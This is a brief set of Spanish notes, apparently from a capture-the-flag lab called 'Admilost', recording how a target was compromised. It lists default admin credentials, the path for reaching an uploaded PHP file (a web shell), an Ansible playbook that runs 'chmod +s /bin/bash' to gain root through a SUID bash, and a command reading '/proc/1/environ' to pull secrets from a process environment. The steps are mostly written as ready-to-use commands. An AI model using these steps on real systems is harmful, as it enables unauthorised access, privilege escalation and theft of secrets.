# Admilost

- ***Usuario:*** admin
- ***Contraseña:*** admin123


### Acceder al archivo subido

`http://admilost.echocity-f.com/adm_my_files/announcements/images/{nombre_archivo.php}`

```
---
- name: Run a command as root using su
  hosts: localhost
  tasks:
    - name: Execute command as root
      shell: 'chmod +s /bin/bash'

```


#### última bandera que encontré (env)

`cat /proc/1/environ`